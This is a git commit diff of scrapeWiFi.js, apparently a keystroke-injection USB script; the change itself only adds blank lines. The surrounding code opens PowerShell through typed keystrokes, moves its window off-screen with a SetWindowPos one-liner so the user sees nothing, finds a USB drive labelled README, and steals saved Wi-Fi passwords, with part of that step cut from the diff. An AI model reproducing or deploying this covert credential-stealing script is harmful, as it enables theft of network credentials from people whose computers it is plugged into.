a42fc83dcfa17282c7ba61af0241457bcd16b5e6
Nexr0n <39227048+Nexr0n@users.noreply.github.com>
2020-05-26 00:15:22 -0400

    Update scrapeWiFi.js

--- scrapeWiFi.js
+++ scrapeWiFi.js
@@ -1,6 +1,7 @@
 function fast() { //sets typing speed as fast as possible with no randomness 
   	typingSpeed(0,0)
 }
+
 function startPS() { //starts powershell (if fails on slower computers extend the delays and see if that helps)
 	press("GUI x");
 	delay(50);
@@ -11,10 +12,12 @@ function startPS() { //starts powershell (if fails on slower computers extend th
 	press("ENTER");
 	delay(200);
 }
+
 function hidePS() { //moves powershell window far outside of screeen coords but keeps window in focus to allow typing off screen
 	type('$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,100,100,16512)')
   	press("ENTER");
 }
+
 function scrapeWiFi() { //scrapes wifi passwords
 	type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'README' } | select name") //gets usb path based on device name, README is the packaged in mass storage vaue, add you own or change it if youd like 
   	press("ENTER");
@@ -25,6 +28,7 @@ function scrapeWiFi() { //scrapes wifi passwords
 	press("ENTER");
   	delay(500);
 }
+
 function exitPS() { //exits Powershell
 	type("exit")
 	press("ENTER");
